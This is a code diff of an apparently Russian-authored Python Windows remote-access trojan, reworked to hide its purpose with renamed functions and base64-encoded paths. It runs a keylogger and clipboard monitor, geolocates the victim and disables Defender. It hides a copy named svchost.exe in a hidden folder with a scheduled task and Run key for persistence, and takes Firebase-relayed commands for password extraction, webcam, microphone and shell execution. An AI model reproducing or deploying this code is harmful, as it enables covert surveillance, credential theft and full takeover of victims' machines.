-        try: os.rmdir(appdata)
-        except: pass
-        print("[PERSIST] Удалено")
-        return True
-    except Exception as e:
-        print(f"[PERSIST] Error: {e}")
-        return False
-
-# --- 7. Defender ---
-def _cmd_disable_defender(db):
-    print("[CMD] Отключение Defender")
-    if not is_admin():
-        db.child(CLIENT_PATH).update({"defender_status": "not_admin"})
-        print("[CMD] Нет прав администратора")
+# ---- ОТКЛЮЧЕНИЕ DEFENDER ----
+def _q(db):
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        db.child(_CLIENT_PATH).update({'defender_status': 'not_admin'})
         return
     try:
-        exe_path = get_exe_path()
-        subprocess.run(f'powershell -Command "Set-MpPreference -ExclusionPath \\"{exe_path}\\""', shell=True, capture_output=True)
+        exe = sys.executable if getattr(sys, 'frozen', False) else sys.executable
+        subprocess.run(f'powershell -Command "Set-MpPreference -ExclusionPath \\"{exe}\\""', shell=True, capture_output=True)
         subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True)
-        db.child(CLIENT_PATH).update({"defender_status": "disabled"})
-        print("[CMD] Defender отключён")
+        db.child(_CLIENT_PATH).update({'defender_status': 'disabled'})
     except Exception as e:
-        db.child(CLIENT_PATH).update({"defender_status": f"error: {e}"})
-        print(f"[ERROR] Defender: {e}")
+        db.child(_CLIENT_PATH).update({'defender_status': f'error: {e}'})
 
-# --- 8. Геолокация ---
-def get_geo_info():
-    print("[GEO] Запрос геолокации")
-    try:
-        resp = requests.get('http://ip-api.com/json/', timeout=5)
-        if resp.status_code == 200:
-            geo = resp.json()
-            if geo.get('status') == 'success':
-                print(f"[GEO] {geo.get('city')}, {geo.get('country')}")
-                return {
-                    "ip": geo.get('query'),
-                    "country": geo.get('country'),
-                    "city": geo.get('city'),
-                    "isp": geo.get('isp'),
-                    "lat": geo.get('lat'),
-                    "lon": geo.get('lon')
-                }
-    except Exception as e:
-        print(f"[GEO] Ошибка: {e}")
-    return None
-
-# ==================== КЕЙЛОГГЕР ====================
-class KeyLogger:
-    def __init__(self, db, client_path):
+# ---- КЕЙЛОГГЕР (класс) ----
+class _KeyLogger:
+    def __init__(self, db):
         self.db = db
-        self.client_path = client_path
         self.buffer = []
-        self.buffer_lock = threading.Lock()
+        self.lock = threading.Lock()
         self.running = False
         self.listener = None
-        self.send_interval = 30
-        self.max_buffer = 1000
 
     def start(self):
         if self.running:
             return
         self.running = True
-        self.listener = keyboard.Listener(on_press=self.on_press)
+        self.listener = _pynput_kb.Listener(on_press=self._on_press)
         self.listener.start()
-        threading.Thread(target=self._send_loop, daemon=True).start()
-        print("[KEYLOG] Кейлоггер запущен")
+        threading.Thread(target=self._loop, daemon=True).start()
 
     def stop(self):
         self.running = False
         if self.listener:
             self.listener.stop()
             self.listener = None
-        self._send_buffer()
-        print("[KEYLOG] Кейлоггер остановлен")
+        self._flush()
 
-    def on_press(self, key):
-        if not self.running: return
+    def _on_press(self, key):
+        if not self.running:
+            return
         try:
             if hasattr(key, 'char') and key.char is not None:
-                char = key.char
+                ch = key.char
             else:
-                char = f'[{key.name}]' if hasattr(key, 'name') else f'[{str(key)}]'
-            with self.buffer_lock:
-                self.buffer.append(char)
-                if len(self.buffer) >= self.max_buffer:
-                    self._send_buffer()
-        except: pass
+                ch = f'[{key.name}]' if hasattr(key, 'name') else f'[{str(key)}]'
+            with self.lock:
+                self.buffer.append(ch)
+                if len(self.buffer) >= 1000:
+                    self._flush()
+        except:
+            pass
 
-    def _send_buffer(self):
-        with self.buffer_lock:
-            if not self.buffer: return
+    def _flush(self):
+        with self.lock:
+            if not self.buffer:
+                return
             text = ''.join(self.buffer)
             self.buffer.clear()
         try:
-            current = self.db.child(self.client_path).child("keylog").get().val() or ""
+            current = self.db.child(_CLIENT_PATH).child('keylog').get().val() or ''
             if len(current) > 5000:
                 current = current[-5000:]
-            new_log = current + text
-            self.db.child(self.client_path).update({"keylog": new_log[-10000:]})
-        except: pass
+            self.db.child(_CLIENT_PATH).update({'keylog': (current + text)[-10000:]})
+        except:
+            pass
 
-    def _send_loop(self):
+    def _loop(self):
         while self.running:
-            time.sleep(self.send_interval)
-            self._send_buffer()
+            time.sleep(30)
+            self._flush()
 
-# ==================== МОНИТОРИНГ БУФЕРА ====================
-def clipboard_monitor(db, client_path):
-    if not CLIP_AVAILABLE:
-        return
-    last_text = ""
-    while True:
-        try:
-            text = pyperclip.paste()
-            if text and text != last_text:
-                db.child(client_path).child("clipboard_history").push({
-                    "text": text[:500],
-                    "timestamp": {".sv": "timestamp"}
-                })
-                last_text = text
-        except: pass
-        time.sleep(2)
-
-# ==================== ОСНОВНОЙ КЛАСС ДЕМОНА ====================
-class RemoteDaemon:
-    def __init__(self):
-        self.stop_event = threading.Event()
-        self.db = None
-        self.tray_icon = None
-        self._connection_ok = False
-        self.blocking_active = False
-        self.block_mouse_listener = None
-        self.block_keyboard_listener = None
-        self.disco_active = False
-        self.keylogger = None
-        self.clipboard_thread = None
-
-    def _init_firebase(self):
-        print("[INIT] Подключение к Firebase...")
-        try:
-            firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
-            self.db = firebase.database()
-            self.db.child("clients").get()
-            self._connection_ok = True
-            print("[INIT] Успех")
-        except Exception as e:
-            print(f"[ERROR] Firebase init: {e}")
-            self._connection_ok = False
-
-    def _heartbeat_loop(self):
-        while not self.stop_event.is_set():
+# ---- МОНИТОРИНГ БУФЕРА ОБМЕНА ----
+def _clip_monitor(db):
+    try:
+        import pyperclip
+        last = ''
+        while True:
             try:
-                if self.db:
-                    self.db.child(CLIENT_PATH).update({"last_seen": {".sv": "timestamp"}})
-            except: pass
+                txt = pyperclip.paste()
+                if txt and txt != last:
+                    db.child(_CLIENT_PATH).child('clipboard_history').push({
+                        'text': txt[:500],
+                        'timestamp': {'.sv': 'timestamp'}
+                    })
+                    last = txt
+            except:
+                pass
+            time.sleep(2)
+    except:
+        pass
+
+# ---- ГЕОЛОКАЦИЯ ----
+def _geo():
+    try:
+        resp = _requests.get(_d('aHR0cDovL2lwLWFwaS5jb20vanNvbi8='), timeout=5)  # http://ip-api.com/json/
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('status') == 'success':
+                return {
+                    'ip': data.get('query'),
+                    'country': data.get('country'),
+                    'city': data.get('city'),
+                    'isp': data.get('isp'),
+                    'lat': data.get('lat'),
+                    'lon': data.get('lon')
+                }
+    except:
+        pass
+    return None
+
+# ---- ПЕРСИСТЕНС (самовосстановление) ----
+def _create_persist():
+    try:
+        appdata = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlcw=='))  # %AppData%\Microsoft\Windows\Caches
+        if not os.path.exists(appdata):
+            os.makedirs(appdata)
+        ctypes.windll.kernel32.SetFileAttributesW(appdata, 2)
+        exe = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+        copy_path = os.path.join(appdata, 'svchost.exe')
+        if getattr(sys, 'frozen', False):
+            shutil.copy2(sys.executable, copy_path)
+        else:
+            shutil.copy2(os.path.abspath(__file__), copy_path + '.py')
+        task = 'RemoteControlTask'
+        subprocess.run(f'schtasks /delete /tn "{task}" /f', shell=True, capture_output=True)
+        subprocess.run(f'schtasks /create /tn "{task}" /tr "{copy_path}" /sc minute /mo 5 /f', shell=True, capture_output=True)
+        return True
+    except:
+        return False
+
+def _remove_persist():
+    try:
+        subprocess.run('schtasks /delete /tn "RemoteControlTask" /f', shell=True, capture_output=True)
+        appdata = os.path.expandvars(_d('JUFwcERhdGElXE1pY3Jvc29mdFxXaW5kb3dzXENhY2hlcw=='))
+        copy_path = os.path.join(appdata, 'svchost.exe')
+        if os.path.exists(copy_path):
+            os.remove(copy_path)
+        py_copy = copy_path + '.py'
+        if os.path.exists(py_copy):
+            os.remove(py_copy)
+        try:
+            os.rmdir(appdata)
+        except:
+            pass
+        return True
+    except:
+        return False
+
+# ---- ОСНОВНОЙ КЛАСС ----
+class _Daemon:
+    def __init__(self):
+        self._stop = threading.Event()
+        self._db = None
+        self._tray = None
+        self._connected = False
+        self._block = False
+        self._ml = None
+        self._kl = None
+        self._disco_active = False
+        self._keylog = None
+        self._clip_thread = None
+
+    def _init_fb(self):
+        try:
+            fb = _pyrebase.initialize_app(_FIREBASE_CONFIG)
+            self._db = fb.database()
+            self._db.child('clients').get()
+            self._connected = True
+        except Exception as e:
+            print(f'FB init error: {e}')
+
+    def _heartbeat(self):
+        while not self._stop.is_set():
+            try:
+                if self._db:
+                    self._db.child(_CLIENT_PATH).update({'last_seen': {'.sv': 'timestamp'}})
+            except:
+                pass
             time.sleep(5)
 
-    def _poll_commands(self):
-        last = "none"
-        while not self.stop_event.is_set():
+    def _poll(self):
+        last = 'none'
+        while not self._stop.is_set():
             try:
-                if not self.db:
+                if not self._db:
                     time.sleep(2)
                     continue
-                data = self.db.child(CLIENT_PATH).get().val()
+                data = self._db.child(_CLIENT_PATH).get().val()
                 if isinstance(data, dict):
-                    cmd = data.get("command", "none")
-                    payload = data.get("payload", "")
-                    if cmd != "none" and cmd != last:
-                        print(f"[POLL] Получена команда: {cmd} (payload: {payload})")
-                        threading.Thread(target=self._execute_command, args=(cmd, payload), daemon=True).start()
-                        self.db.child(CLIENT_PATH).update({"command": "none"})
+                    cmd = data.get('command', 'none')
+                    payload = data.get('payload', '')
+                    if cmd != 'none' and cmd != last:
+                        threading.Thread(target=self._exec, args=(cmd, payload), daemon=True).start()
+                        self._db.child(_CLIENT_PATH).update({'command': 'none'})
                     last = cmd
-            except Exception as e:
-                print(f"[POLL] Error: {e}")
+            except:
+                pass
             time.sleep(2)
 
-    def _execute_command(self, cmd, payload):
+    def _exec(self, cmd, payload):
         try:
-            if cmd == "rickroll":
-                _cmd_rickroll()
-            elif cmd == "msg":
-                _cmd_message(payload)
-            elif cmd == "crazy_mouse":
-                _cmd_crazy_mouse()
-            elif cmd == "block_input":
-                enable = payload.lower() == "true"
-                if enable and not self.blocking_active:
-                    self.blocking_active = True
-                    self._start_input_block()
-                    print("[CMD] Блокировка включена")
-                elif not enable and self.blocking_active:
-                    self.blocking_active = False
-                    self._stop_input_block()
-                    print("[CMD] Блокировка выключена")
-            elif cmd == "screenshot":
-                _cmd_screenshot(self.db)
-            elif cmd == "wallpaper":
-                _cmd_wallpaper(payload)
-            elif cmd == "tts":
-                _cmd_tts(payload)
-            elif cmd == "open_calc":
-                _cmd_open_calc()
-            elif cmd == "swap_mouse":
-                _cmd_swap_mouse()
-            elif cmd == "self_destruct":
-                _cmd_self_destruct(self.db, self)
-            elif cmd == "cmd_execute":
-                _cmd_execute(payload, self.db)
-            elif cmd == "disco":
-                _cmd_disco(payload, self)
-            elif cmd == "extract_passwords":
-                _cmd_extract_passwords(self.db)
-            elif cmd == "record_mic":
-                _cmd_record_mic(self.db, payload)
-            elif cmd == "webcam_snapshot":
-                _cmd_webcam_snapshot(self.db)
-            elif cmd == "file_manager":
-                _cmd_file_manager(self.db, payload)
-            elif cmd == "powershell_execute":
-                _cmd_powershell_execute(self.db, payload)
-            elif cmd == "disable_defender":
-                _cmd_disable_defender(self.db)
-            elif cmd == "create_persistence":
-                create_persistence()
-            elif cmd == "remove_persistence":
-                remove_persistence()
-            else:
-                print(f"[CMD] Неизвестная команда: {cmd}")
+            if cmd == 'rickroll':
+                _a()
+            elif cmd == 'msg':
+                _b(payload)
+            elif cmd == 'crazy_mouse':
+                _c()
+            elif cmd == 'block_input':
+                en = payload.lower() == 'true'
+                if en and not self._block:
+                    self._block = True
+                    self._block_start()
+                elif not en and self._block:
+                    self._block = False
+                    self._block_stop()
+            elif cmd == 'screenshot':
+                _d_screenshot(self._db)
+            elif cmd == 'wallpaper':
+                _e(payload)
+            elif cmd == 'tts':
+                _f(payload)
+            elif cmd == 'open_calc':
+                _g()
+            elif cmd == 'swap_mouse':
+                _h()
+            elif cmd == 'self_destruct':
+                _i(self._db, self)
+            elif cmd == 'cmd_execute':
+                _j(payload, self._db)
+            elif cmd == 'disco':
+                _k(payload, self)
+            elif cmd == 'file_manager':
+                _l(self._db, payload)
+            elif cmd == 'extract_passwords':
+                _m(self._db)
+            elif cmd == 'record_mic':
+                _n(self._db, payload)
+            elif cmd == 'webcam_snapshot':
+                _o(self._db)
+            elif cmd == 'powershell_execute':
+                _p(self._db, payload)
+            elif cmd == 'disable_defender':
+                _q(self._db)
+            elif cmd == 'create_persistence':
+                _create_persist()
+            elif cmd == 'remove_persistence':
+                _remove_persist()
         except Exception as e:
-            print(f"[ERROR] Выполнение команды {cmd}: {e}")
-            try:
-                self.db.child(CLIENT_PATH).update({"last_command_error": traceback.format_exc()[:1000]})
-            except: pass
+            _err(self._db, e)
 
-    def _start_input_block(self):
-        def sup(*a): return False
-        self.block_mouse_listener = mouse.Listener(suppress=True, on_move=sup, on_click=sup, on_scroll=sup)
-        self.block_keyboard_listener = keyboard.Listener(suppress=True, on_press=sup, on_release=sup)
-        self.block_mouse_listener.start()
-        self.block_keyboard_listener.start()
+    def _block_start(self):
+        def sup(*a):
+            return False
+        self._ml = _pynput_mouse.Listener(suppress=True, on_move=sup, on_click=sup, on_scroll=sup)
+        self._kl = _pynput_kb.Listener(suppress=True, on_press=sup, on_release=sup)
+        self._ml.start()
+        self._kl.start()
 
-    def _stop_input_block(self):
-        if self.block_mouse_listener:
-            self.block_mouse_listener.stop()
-            self.block_mouse_listener = None
-        if self.block_keyboard_listener:
-            self.block_keyboard_listener.stop()
-            self.block_keyboard_listener = None
+    def _block_stop(self):
+        if self._ml:
+            self._ml.stop()
+            self._ml = None
+        if self._kl:
+            self._kl.stop()
+            self._kl = None
 
-    def _auto_screenshot_loop(self):
-        while not self.stop_event.is_set():
-            _cmd_screenshot(self.db)
-            for _ in range(10):
-                if self.stop_event.is_set(): break
-                time.sleep(1)
-
-    def disable_startup(self):
+    def _disable_startup(self):
         try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
-                                 0, winreg.KEY_SET_VALUE)
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu'), 0, winreg.KEY_SET_VALUE)
             try:
-                winreg.DeleteValue(key, "RemoteControl")
-            except: pass
+                winreg.DeleteValue(key, 'RemoteControl')
+            except:
+                pass
             winreg.CloseKey(key)
-        except: pass
-        remove_persistence()
-        if self.tray_icon:
-            self.tray_icon.notify("Автозагрузка и планировщик отключены", "Remote Control")
-        print("[DISABLE] Автозагрузка отключена")
-
-    def _create_tray_icon(self):
-        print("[TRAY] Создание иконки")
-        size = 64
-        img = Image.new("RGBA", (size,size), (0,0,0,0))
-        dc = ImageDraw.Draw(img)
-        dc.ellipse((4,4,size-4,size-4), fill=(0,120,255,255))
-        try:
-            font = ImageFont.truetype("arial.ttf", 30)
         except:
-            font = ImageFont.load_default()
-        dc.text((18,14), "R", fill=(255,255,255,255), font=font)
-        menu = pystray.Menu(
-            pystray.MenuItem(lambda item: f"ID: {USER_ID}", None, enabled=False),
-            pystray.MenuItem(lambda item: f"Online" if self._connection_ok else "Offline", None, enabled=False),
-            pystray.MenuItem("Переподключиться", lambda icon: self._init_firebase()),
-            pystray.MenuItem("Отключить автозапуск", lambda icon: self.disable_startup()),
-            pystray.MenuItem("Выход", lambda icon: self._shutdown())
-        )
-        self.tray_icon = pystray.Icon("RemoteControl", img, "System", menu)
-        self.tray_icon.run()
+            pass
+        _remove_persist()
+        if self._tray:
+            self._tray.notify('Автозагрузка и планировщик отключены', 'Remote Control')
+
+    def _tray_icon(self):
+        try:
+            size = 64
+            img = _PIL_Image.new('RGBA', (size, size), (0,0,0,0))
+            dc = _PIL_Draw.Draw(img)
+            dc.ellipse((4,4,size-4,size-4), fill=(0,120,255,255))
+            try:
+                font = _PIL_Font.truetype('arial.ttf', 30)
+            except:
+                font = _PIL_Font.load_default()
+            dc.text((18,14), 'R', fill=(255,255,255,255), font=font)
+            menu = _pystray.Menu(
+                _pystray.MenuItem(lambda item: f'ID: {_USER_ID}', None, enabled=False),
+                _pystray.MenuItem(lambda item: 'Online' if self._connected else 'Offline', None, enabled=False),
+                _pystray.MenuItem('Переподключиться', lambda icon: self._init_fb()),
+                _pystray.MenuItem('Отключить автозапуск', lambda icon: self._disable_startup()),
+                _pystray.MenuItem('Выход', lambda icon: self._shutdown())
+            )
+            self._tray = _pystray.Icon('RemoteControl', img, 'System', menu)
+            self._tray.run()
+        except Exception as e:
+            print(f'Tray error: {e}')
 
     def _shutdown(self):
-        print("[SHUTDOWN] Завершение работы")
-        self.stop_event.set()
-        if self.blocking_active:
-            self._stop_input_block()
-        if self.keylogger:
-            self.keylogger.stop()
+        self._stop.set()
+        if self._block:
+            self._block_stop()
+        if self._keylog:
+            self._keylog.stop()
         try:
-            if self.db:
-                self.db.child(CLIENT_PATH).update({"status": "offline"})
-        except: pass
-        if self.tray_icon:
-            self.tray_icon.stop()
+            if self._db:
+                self._db.child(_CLIENT_PATH).update({'status': 'offline'})
+        except:
+            pass
+        if self._tray:
+            self._tray.stop()
         sys.exit(0)
 
     def run(self):
-        global db
-        self._init_firebase()
-        db = self.db
-
+        self._init_fb()
         try:
-            self.db.child(CLIENT_PATH).set({
-                "status": "online",
-                "last_seen": {".sv": "timestamp"},
-                "command": "none",
-                "payload": "",
-                "screenshot": "",
-                "last_cmd_output": ""
+            self._db.child(_CLIENT_PATH).set({
+                'status': 'online',
+                'last_seen': {'.sv': 'timestamp'},
+                'command': 'none',
+                'payload': '',
+                'screenshot': '',
+                'last_cmd_output': ''
             })
-            print(f"[REG] {USER_ID} зарегистрирован")
         except Exception as e:
-            print(f"[ERROR] Регистрация: {e}")
+            print(f'Reg error: {e}')
 
-        # Автозагрузка в реестр
+        # Автозагрузка
         try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
-                                 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "RemoteControl", 0, winreg.REG_SZ, get_exe_path())
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d('U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu'), 0, winreg.KEY_SET_VALUE)
+            exe = sys.executable if getattr(sys, 'frozen', False) else f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+            winreg.SetValueEx(key, 'RemoteControl', 0, winreg.REG_SZ, exe)
             winreg.CloseKey(key)
-            print("[STARTUP] Добавлено в автозагрузку")
-        except Exception as e:
-            print(f"[STARTUP] Ошибка: {e}")
+        except:
+            pass
 
-        create_persistence()
+        _create_persist()
 
-        geo = get_geo_info()
+        # Геолокация
+        geo = _geo()
         if geo:
             try:
-                self.db.child(CLIENT_PATH).update({"geo": geo})
-            except: pass
+                self._db.child(_CLIENT_PATH).update({'geo': geo})
+            except:
+                pass
 
-        self.keylogger = KeyLogger(self.db, CLIENT_PATH)
-        self.keylogger.start()
+        # Кейлоггер
+        self._keylog = _KeyLogger(self._db)
+        self._keylog.start()
 
-        if CLIP_AVAILABLE:
-            self.clipboard_thread = threading.Thread(target=clipboard_monitor, args=(self.db, CLIENT_PATH), daemon=True)
-            self.clipboard_thread.start()
-            print("[CLIP] Мониторинг буфера обмена запущен")
-
-        threading.Thread(target=self._heartbeat_loop, daemon=True).start()
-        threading.Thread(target=self._poll_commands, daemon=True).start()
-        threading.Thread(target=self._auto_screenshot_loop, daemon=True).start()
-        threading.Thread(target=self._create_tray_icon, daemon=True).start()
-
-        self.stop_event.wait()
-
-if __name__ == "__main__":
-    try:
-        RemoteDaemon().run()
-    except Exception as e:
-        print(f"[FATAL] {e}")
-        traceback.print_exc()
+        # Мониторинг буфера
         try:
-            firebase = pyrebase.initialize_app(FIREBASE_CONFIG)
-            db = firebase.database()
-            db.child(CLIENT_PATH).update({"fatal_error": traceback.format_exc()[:1000]})
-        except: pass
-        input("Нажмите Enter для выхода...")
+            import pyperclip
+            self._clip_thread = threading.Thread(target=_clip_monitor, args=(self._db,), daemon=True)
+            self._clip_thread.start()
+        except:
+            pass
+
+        # Потоки
+        threading.Thread(target=self._heartbeat, daemon=True).start()
+        threading.Thread(target=self._poll, daemon=True).start()
+        threading.Thread(target=self._tray_icon, daemon=True).start()
+
+        self._stop.wait()
+
+if __name__ == '__main__':
+    try:
+        _Daemon().run()
+    except Exception as e:
+        try:
+            fb = _pyrebase.initialize_app(_FIREBASE_CONFIG)
+            db = fb.database()
+            db.child(_CLIENT_PATH).update({'fatal_error': traceback.format_exc()[:1000]})
+        except:
+            pass
+        traceback.print_exc()
+        input('Press Enter to exit...')
